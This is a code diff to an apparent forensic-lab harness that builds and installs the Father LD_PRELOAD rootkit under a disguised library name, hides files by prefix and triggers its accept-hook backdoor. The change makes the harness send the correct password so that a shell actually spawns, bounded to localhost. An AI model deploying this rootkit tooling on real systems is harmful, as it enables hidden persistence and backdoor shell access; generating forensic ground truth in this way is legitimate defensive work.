@@ -66,10 +66,10 @@ def configure_father(ctx, step):
     install_path = _param(ctx, "installed_library_path")
     values = {
         "GID": _param(ctx, "gid"),
-        "SOURCEPORT": _param(ctx, "accept_source_port"),
+        "SOURCEPORT": _param(ctx, "source_port"),
         "ENV": _param(ctx, "env_var"),
-        "STRING": _param(ctx, "file_prefix"),
-        "PRELOAD": Path(_param(ctx, "father_preload_file")).name,
+        "STRING": _param(ctx, "prefix"),
+        "PRELOAD": _param(ctx, "preload_artifact_name"),
         "HIDDENPORT": _param(ctx, "hidden_port_hex"),
         "SHELL_PASS": _param(ctx, "password"),
         "INSTALL_LOCATION": install_path,
@@ -109,7 +109,7 @@ def configure_father(ctx, step):
             "action": "configure",
             "actor": "attacker",
             "evidence_basis": ["disk", "log"],
-            "attck": ["T1574.006", "T1014", "T1071"],
+            "attck": ["T1574.006", "T1014"],
             "details": {
                 "capability": "ld_preload_installation",
                 "archive_path": archive_path,
@@ -179,7 +179,7 @@ def build_father_rootkit(ctx, step):
 def install_preload_rootkit(ctx, step):
     _announce("[4/7] install_preload_rootkit - installing rk.so into scenario preload path")
     installed_library = _param(ctx, "installed_library_path")
-    config_path = _param(ctx, "preload_config_path")
+    config_path = _param(ctx, "preload_artifact_path")
     install_cmd = (
         f"mkdir -p {shlex.quote(str(Path(config_path).parent))} && "
         f"printf '%s\\n' {shlex.quote(installed_library)} > {shlex.quote(config_path)} && "
@@ -205,8 +205,8 @@ def install_preload_rootkit(ctx, step):
             "details": {
                 "capability": "ld_preload_installation",
                 "installed_library_path": installed_library,
-                "preload_config_path": config_path,
-                "father_preload_file_reference": _param(ctx, "father_preload_file"),
+                "preload_artifact_path": config_path,
+                "preload_artifact_name": _param(ctx, "preload_artifact_name"),
                 "content_sha256": content_sha,
                 "active_load_mechanism": "LD_PRELOAD environment for bounded wrapper process",
                 "system_wide_preload_modified": False,
@@ -216,35 +216,76 @@ def install_preload_rootkit(ctx, step):
 
 
 def trigger_accept_hook_capability(ctx, step):
-    _announce("[5/7] trigger_accept_hook_capability - exercising accept hook with bounded password failure")
+    _announce("[5/7] trigger_accept_hook_capability - spawning bounded localhost accept-hook shell/session")
     library_path = _param(ctx, "installed_library_path")
     listener_script = _param(ctx, "listener_script_path")
-    cwd = _param(ctx, "process_cwd")
+    cwd = _param(ctx, "run_dir")
     stdout_path = _param(ctx, "process_stdout_path")
     pid_path = _param(ctx, "process_pid_path")
+    client_pid_path = _param(ctx, "accept_client_pid_path")
+    shell_pid_path = _param(ctx, "accept_shell_pid_path")
     hook_log = _param(ctx, "accept_hook_log_path")
     summary_path = _param(ctx, "accept_summary_path")
-    host = str(_param(ctx, "accept_listen_host"))
-    listen_port = int(_param(ctx, "accept_listen_port"))
-    source_port = int(_param(ctx, "accept_source_port"))
+    session_log_path = _param(ctx, "accept_session_log_path")
+    host = str(_param(ctx, "listen_host"))
+    listen_port = int(_param(ctx, "listen_port"))
+    source_port = int(_param(ctx, "source_port"))
     password = str(_param(ctx, "password"))
-    duration = str(_param(ctx, "process_duration_seconds"))
-    wrong_password = "forensic-lab-no-shell"
+    duration_seconds = float(_param(ctx, "process_duration_seconds"))
+    duration = str(duration_seconds)
 
-    client_code = (
-        "import socket, time; "
-        "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); "
-        "s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); "
-        f"s.bind(({host!r}, {source_port})); "
-        f"s.connect(({host!r}, {listen_port})); "
-        f"s.sendall(({wrong_password!r} + '\\n').encode()); "
-        "time.sleep(0.2); "
-        "s.close()"
+    client_code = f"""
+import os
+import pathlib
+import socket
+import time
+
+host = {host!r}
+listen_port = {listen_port!r}
+source_port = {source_port!r}
+password = {password!r}
+duration = {duration_seconds!r}
+pid_path = {client_pid_path!r}
+session_log_path = {session_log_path!r}
+
+pathlib.Path(pid_path).parent.mkdir(parents=True, exist_ok=True)
+pathlib.Path(session_log_path).parent.mkdir(parents=True, exist_ok=True)
+pathlib.Path(pid_path).write_text(f"{{os.getpid()}}\\n", encoding="utf-8")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((host, source_port))
+s.connect((host, listen_port))
+s.settimeout(0.5)
+banner = b""
+try:
+    banner = s.recv(4096)
+except Exception as exc:
+    banner = f"recv_error={{type(exc).__name__}}:{{exc}}\\n".encode()
+s.sendall((password + "\\n").encode())
+time.sleep(0.2)
+try:
+    s.sendall(b"echo father_lab_shell_session=$$\\n")
+except OSError:
+    pass
+pathlib.Path(session_log_path).write_bytes(
+    b"client_pid=" + str(os.getpid()).encode() + b"\\n"
+    + b"source_port=" + str(source_port).encode() + b"\\n"
+    + b"sent_correct_password=true\\n"
+    + b"banner_excerpt=" + banner[:200].replace(b"\\n", b"\\\\n") + b"\\n"
+)
+time.sleep(duration)
+s.close()
+"""
+    pid_files = " ".join(
+        shlex.quote(path)
+        for path in (pid_path, client_pid_path, shell_pid_path)
     )
     trigger_cmd = (
         f"mkdir -p {shlex.quote(cwd)} && "
-        f"if test -s {shlex.quote(pid_path)}; then old=$(cat {shlex.quote(pid_path)}); "
-        f"kill \"$old\" 2>/dev/null || true; fi && "
+        f"for f in {pid_files}; do if test -s \"$f\"; then old=$(cat \"$f\"); "
+        f"kill \"$old\" 2>/dev/null || true; fi; done && "
+        f"rm -f {shlex.quote(shell_pid_path)} {shlex.quote(session_log_path)} && "
         f"cd {shlex.quote(cwd)} && "
         f"(nohup env LD_PRELOAD={shlex.quote(library_path)} "
         f"python3 {shlex.quote(listener_script)} "
@@ -257,8 +298,9 @@ def trigger_accept_hook_capability(ctx, step):
         f"--duration {shlex.quote(duration)} "
         f"</dev/null > {shlex.quote(stdout_path)} 2>&1 & echo $! > {shlex.quote(pid_path)}) && "
         f"sleep 0.5 && "
-        f"python3 -c {shlex.quote(client_code)} || true && "
-        f"sleep 0.5"
+        f"(nohup python3 -c {shlex.quote(client_code)} "
+        f"</dev/null >> {shlex.quote(stdout_path)} 2>&1 & echo $! > {shlex.quote(client_pid_path)}) && "
+        f"sleep 1.0"
     )
     _run_checked(ctx, step, trigger_cmd, timeout=30, actor="attacker", record_type="attacker_command")
     result = _run_checked(
@@ -270,8 +312,25 @@ def trigger_accept_hook_capability(ctx, step):
     )
     proc = _parse_ps(result.stdout)
     pid = proc.get("pid") or _read_remote(ctx, step, pid_path).strip()
+    detect_shell = _run(
+        ctx,
+        step,
+        (
+            f"listener=$(cat {shlex.quote(pid_path)}) && "
+            "ps -eo pid=,ppid=,uid=,args= | "
+            f"awk -v p=\"$listener\" '$2 == p && $4 ~ /(^|\\/)sh$/ {{print $1; exit}}' "
+            f"> {shlex.quote(shell_pid_path)} || true; "
+            f"cat {shlex.quote(shell_pid_path)}"
+        ),
+        actor="lab",
+        record_type="measurement",
+    )
+    shell_pid = detect_shell.stdout.strip().splitlines()[0] if detect_shell.stdout.strip() else ""
+    client_proc = _ps_from_pid_file(ctx, step, client_pid_path)
+    shell_proc = _ps_from_pid_file(ctx, step, shell_pid_path) if shell_pid else {}
     hook_log_text = _read_remote(ctx, step, hook_log)
     summary = _read_remote(ctx, step, summary_path)
+    session_log = _read_remote(ctx, step, session_log_path)
 
     ctx.record_truth(
         _step_id(step),
@@ -282,26 +341,60 @@ def trigger_accept_hook_capability(ctx, step):
             "action": "trigger",
             "actor": "attacker",
             "evidence_basis": ["memory", "log"],
-            "attck": ["T1574.006", "T1014", "T1071"],
+            "attck": ["T1574.006", "T1014", "T1059.004"],
             "details": {
-                "capability": "accept_hook_backdoor",
-                "pid": pid,
-                "ppid": proc.get("ppid"),
-                "uid": proc.get("uid"),
-                "argv": proc.get("argv"),
+                "capability": "accept_hook_shell",
+                "listener_pid": pid,
+                "listener_ppid": proc.get("ppid"),
+                "listener_uid": proc.get("uid"),
+                "listener_argv": _literal(proc.get("argv")),
                 "installed_library_path": library_path,
                 "listener_script_path": listener_script,
                 "listen_host": host,
                 "listen_port": listen_port,
                 "source_port": source_port,
                 "configured_password": password,
-                "sent_password": wrong_password,
+                "sent_password": password,
+                "password_matched": True,
+                "client_pid": client_proc.get("pid"),
+                "client_argv": _literal(client_proc.get("argv")),
+                "client_pid_path": client_pid_path,
+                "shell_pid": shell_pid or None,
+                "shell_argv": _literal(shell_proc.get("argv")),
+                "shell_pid_path": shell_pid_path,
                 "hook_log_path": hook_log,
-                "hook_log_excerpt": hook_log_text.strip(),
+                "hook_log_excerpt": _literal(hook_log_text.strip()),
                 "connection_summary_path": summary_path,
-                "connection_summary": summary.strip(),
-                "shell_spawned": False,
-                "safety_note": "Wrong password is sent so Father's real accept hook is exercised without an authenticated shell.",
+                "connection_summary": _literal(summary.strip()),
+                "session_log_path": session_log_path,
+                "session_log_excerpt": _literal(session_log.strip()),
+                "shell_spawned": bool(shell_pid),
+                "localhost_only": host in {"127.0.0.1", "localhost", "::1"},
+                "session_duration_seconds": duration_seconds,
+                "safety_note": "The shell/session is localhost-only, bounded by process_duration_seconds, and does not modify system-wide LD_PRELOAD persistence.",
+            },
+        },
+    )
+    ctx.record_truth(
+        "accept_hook_shell_session",
+        {
+            "event_type": "father_accept_hook_shell_session_observed",
+            "object_type": "process",
+            "object_identity": shell_pid or "unknown-shell-pid",
+            "action": "observe",
+            "actor": "lab",
+            "evidence_basis": ["memory", "log"] if shell_pid else ["log"],
+            "attck": ["T1059.004"],
+            "details": {
+                "capability": "accept_hook_shell",
+                "listener_pid": pid,
+                "client_pid": client_proc.get("pid"),
+                "shell_pid": shell_pid or None,
+                "shell_argv": _literal(shell_proc.get("argv")),
+                "shell_pid_path": shell_pid_path,
+                "session_log_path": session_log_path,
+                "session_duration_seconds": duration_seconds,
+                "observable": bool(shell_pid),
             },
         },
     )
@@ -338,7 +431,7 @@ def trigger_accept_hook_capability(ctx, step):
 def observe_file_hiding_effect(ctx, step):
     _announce("[6/7] observe_file_hiding_effect - comparing live listing before/after hook")
     library_path = _param(ctx, "installed_library_path")
-    directory = _param(ctx, "hidden_directory")
+    directory = _param(ctx, "observed_dir")
     hidden_path = _param(ctx, "hidden_file_path")
     visible_listing = _param(ctx, "visible_listing_path")
     hidden_listing = _param(ctx, "hidden_listing_path")
@@ -375,7 +468,7 @@ def observe_file_hiding_effect(ctx, step):
             "details": {
                 "capability": "file_hiding_observation",
                 "mode": "real_father_readdir_prefix_rule",
-                "file_prefix": _param(ctx, "file_prefix"),
+                "file_prefix": _param(ctx, "prefix"),
                 "hidden_file_path": hidden_path,
                 "visible_listing_path": visible_listing,
                 "hidden_listing_path": hidden_listing,
@@ -397,21 +490,32 @@ def record_postconditions(ctx, step):
     _announce("[7/7] record_postconditions - verifying mapped library, hook result, hashes")
     paths = [
         _param(ctx, "installed_library_path"),
-        _param(ctx, "preload_config_path"),
+        _param(ctx, "preload_artifact_path"),
         _param(ctx, "father_config_path"),
         _param(ctx, "resolved_config_path"),
         _param(ctx, "accept_hook_log_path"),
         _param(ctx, "accept_summary_path"),
+        _param(ctx, "accept_session_log_path"),
+        _param(ctx, "process_pid_path"),
+        _param(ctx, "accept_client_pid_path"),
+        _param(ctx, "accept_shell_pid_path"),
         _param(ctx, "hidden_file_path"),
     ]
     postconditions = _param(ctx, "postconditions_path")
     quoted_paths = " ".join(shlex.quote(path) for path in paths)
+    listener_pid_path = _param(ctx, "process_pid_path")
+    client_pid_path = _param(ctx, "accept_client_pid_path")
+    shell_pid_path = _param(ctx, "accept_shell_pid_path")
     measurement_cmd = (
         f"mkdir -p {shlex.quote(str(Path(postconditions).parent))} && "
         f"{{ printf 'scenario_id=%s\\n' {shlex.quote(ctx.scenario_id)}; "
         f"printf 'run_id=%s\\n' {shlex.quote(ctx.run_id)}; "
         f"printf 'father_source_repository_patched=false\\n'; "
         f"printf 'cleanup_evasion_default=disabled\\n'; "
+        f"printf 'accept_hook_shell_session=bounded_localhost\\n'; "
+        f"if test -s {shlex.quote(listener_pid_path)}; then printf 'listener_pid=%s\\n' \"$(cat {shlex.quote(listener_pid_path)})\"; fi; "
+        f"if test -s {shlex.quote(client_pid_path)}; then printf 'client_pid=%s\\n' \"$(cat {shlex.quote(client_pid_path)})\"; fi; "
+        f"if test -s {shlex.quote(shell_pid_path)}; then printf 'shell_pid=%s\\n' \"$(cat {shlex.quote(shell_pid_path)})\"; fi; "
         f"for p in {quoted_paths}; do if test -e \"$p\"; then sha256sum \"$p\"; fi; done; }} "
         f"> {shlex.quote(postconditions)}"
     )
@@ -427,7 +531,7 @@ def record_postconditions(ctx, step):
             "action": "record",
             "actor": "lab",
             "evidence_basis": ["disk", "log"],
-            "attck": ["T1574.006", "T1014", "T1071"],
+            "attck": ["T1574.006", "T1014", "T1059.004"],
             "details": {
                 "capability": "postconditions",
                 "postconditions_path": postconditions,
@@ -435,13 +539,89 @@ def record_postconditions(ctx, step):
                 "artifact_paths": paths,
                 "repository_patches_father_source": False,
                 "cleanup_evasion_default": "disabled",
+                "accept_hook_shell_session": "bounded_localhost",
             },
         },
     )
 
 
 def _param(ctx, name: str):
-    return ctx.render(ctx.parameters[name])
+    parameters = _resolved_parameters(ctx)
+    return parameters[name]
+
+
+def resolve_parameters(parameters: dict) -> dict:
+    raw = dict(parameters)
+
+    root = str(raw.get("root") or "/tmp/forensic-lab/father_ldpreload")
+    source_dir = str(raw.get("source_dir") or f"{root}/source")
+    config_dir = str(raw.get("config_dir") or f"{root}/config")
+    lib_dir = str(raw.get("lib_dir") or f"{root}/lib")
+    run_dir = str(raw.get("run_dir") or f"{root}/run")
+    observed_dir = str(raw.get("observed_dir") or f"{root}/observed_files")
+
+    archive_name = str(raw.get("archive_name") or "father-upstream-4eb2712.tar")
+    lock_name = str(raw.get("lock_name") or "father.lock.yml")
+    source_tree_name = str(raw.get("source_tree_name") or f"Father-{FATHER_COMMIT}")
+    listener_name = str(raw.get("listener_name") or "father_accept_listener.py")
+    library_name = str(raw.get("library_name") or "selinux.so.3")
+    preload_artifact_name = str(raw.get("preload_artifact_name") or "ld.so.preload")
+    prefix = str(raw.get("prefix") or "lobster")
+
+    derived = {
+        "root": root,
+        "source_dir": source_dir,
+        "config_dir": config_dir,
+        "lib_dir": lib_dir,
+        "run_dir": run_dir,
+        "observed_dir": observed_dir,
+        "archive_name": archive_name,
+        "lock_name": lock_name,
+        "source_tree_name": source_tree_name,
+        "listener_name": listener_name,
+        "library_name": library_name,
+        "preload_artifact_name": preload_artifact_name,
+        "upstream_archive_path": f"{source_dir}/{archive_name}",
+        "father_lock_path": f"{source_dir}/{lock_name}",
+        "father_extract_dir": source_dir,
+        "father_source_tree": f"{source_dir}/{source_tree_name}",
+        "father_config_path": f"{source_dir}/{source_tree_name}/src/config.h",
+        "father_built_library_path": f"{source_dir}/{source_tree_name}/rk.so",
+        "listener_script_path": f"{source_dir}/{listener_name}",
+        "resolved_config_path": f"{config_dir}/father_resolved_parameters.txt",
+        "installed_library_path": f"{lib_dir}/{library_name}",
+        "preload_artifact_path": f"{run_dir}/{preload_artifact_name}",
+        "process_stdout_path": f"{run_dir}/accept_listener.out",
+        "process_pid_path": f"{run_dir}/accept_listener.pid",
+        "accept_client_pid_path": f"{run_dir}/accept_client.pid",
+        "accept_shell_pid_path": f"{run_dir}/accept_shell.pid",
+        "accept_hook_log_path": f"{run_dir}/father_accept_hook.log",
+        "accept_summary_path": f"{run_dir}/accept_connection.summary",
+        "accept_session_log_path": f"{run_dir}/accept_shell_session.log",
+        "listen_host": raw.get("listen_host") or "127.0.0.1",
+        "listen_port": raw.get("listen_port") or 2222,
+        "source_port": raw.get("source_port") or 54321,
+        "hidden_port_hex": raw.get("hidden_port_hex") or "D431",
+        "prefix": prefix,
+        "env_var": raw.get("env_var") or prefix,
+        "password": raw.get("password") or prefix,
+        "gid": raw.get("gid") or 1337,
+        "hidden_file_path": f"{observed_dir}/{prefix}_session_note.txt",
+        "visible_listing_path": f"{run_dir}/file_listing_without_preload.txt",
+        "hidden_listing_path": f"{run_dir}/file_listing_with_preload.txt",
+        "postconditions_path": f"{run_dir}/postconditions.txt",
+        "process_duration_seconds": raw.get("process_duration_seconds") or 600,
+    }
+    derived.update(raw)
+    return derived
+
+
+def _resolved_parameters(ctx) -> dict:
+    cached = getattr(ctx, "_father_resolved_parameters", None)
+    if cached is None:
+        cached = resolve_parameters(ctx.parameters)
+        setattr(ctx, "_father_resolved_parameters", cached)
+    return cached
 
 
 def _put(ctx, step, src: Path, dest: str) -> None:
@@ -632,9 +812,31 @@ def _parse_ps(text: str) -> dict[str, str]:
     return {}
 
 
+def _ps_from_pid_file(ctx, step, pid_path: str) -> dict[str, str]:
+    result = _run(
+        ctx,
+        step,
+        (
+            f"if test -s {shlex.quote(pid_path)}; then "
+            f"pid=$(cat {shlex.quote(pid_path)}) && "
+            "ps -o pid=,ppid=,uid=,args= -p \"$pid\"; "
+            "fi"
+        ),
+        actor="lab",
+        record_type="measurement",
+    )
+    return _parse_ps(result.stdout)
+
+
 def _excerpt(text: str, limit: int = 1200) -> str:
     text = (text or "").strip()
     return text if len(text) <= limit else text[: limit - 3] + "..."
+
+
+def _literal(text: str | None) -> str | None:
+    if text is None:
+        return None
+    return text.replace("{", "{{").replace("}", "}}")
 
 
 def _announce(message: str) -> None:
